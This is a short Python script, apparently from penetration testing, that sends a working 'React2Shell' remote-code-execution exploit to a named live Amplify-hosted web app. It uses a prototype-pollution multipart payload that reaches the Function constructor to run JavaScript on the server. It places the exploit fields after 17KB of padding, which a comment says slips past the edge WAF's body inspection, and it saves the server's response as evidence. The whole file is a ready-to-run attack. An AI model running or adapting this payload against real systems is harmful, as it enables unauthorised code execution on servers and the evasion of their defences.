"""Re-runs the minimal React2Shell verification and saves full evidence."""
import http.client
import json
import ssl

HOST = "main.d4zeeqgazhley.amplifyapp.com"

marker = ("var res='R2S_CONFIRMED_'+process.version;"
          "throw Object.assign(new Error('NEXT_REDIRECT'),"
          "{digest:'NEXT_REDIRECT;push;/r2s?m='+res+';307;'});")

field0 = json.dumps({
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then":"$B1337"}',
    "_response": {
        "_prefix": marker,
        "_chunks": "$Q2",
        "_formData": {"get": "$1:constructor:constructor"},
    },
})

bnd = "----R2S7MA4YWxkTrZu0gW"
body = (f"--{bnd}\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n"
        + "A" * 17000 + "\r\n"
        + f"--{bnd}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{field0}\r\n"
        + f"--{bnd}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n"
        + f"--{bnd}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n"
        + f"--{bnd}--\r\n")

conn = http.client.HTTPSConnection(HOST, 443, context=ssl.create_default_context())
conn.request("POST", "/", body=body.encode(), headers={
    "Host": HOST,
    "Next-Action": "x",
    "Content-Type": f"multipart/form-data; boundary={bnd}",
})
resp = conn.getresponse()
payload = resp.read().decode("utf-8", "replace")

with open("evidence-r2s-response.txt", "w", encoding="utf-8") as f:
    f.write(f"POST https://{HOST}/  (multipart, exploit fields placed after "
            f"17KB padding - bypasses edge WAF body inspection)\n")
    f.write(f"Executed server-side (read-only): {marker}\n\n")
    f.write(f"HTTP {resp.status} {resp.reason}\n")
    for k, v in resp.getheaders():
        f.write(f"{k}: {v}\n")
    f.write("\n--- body ---\n")
    f.write(payload[:2000])

print(f"HTTP {resp.status}")
for k, v in resp.getheaders():
    print(f"{k}: {v}")
print("evidence saved to evidence-r2s-response.txt")
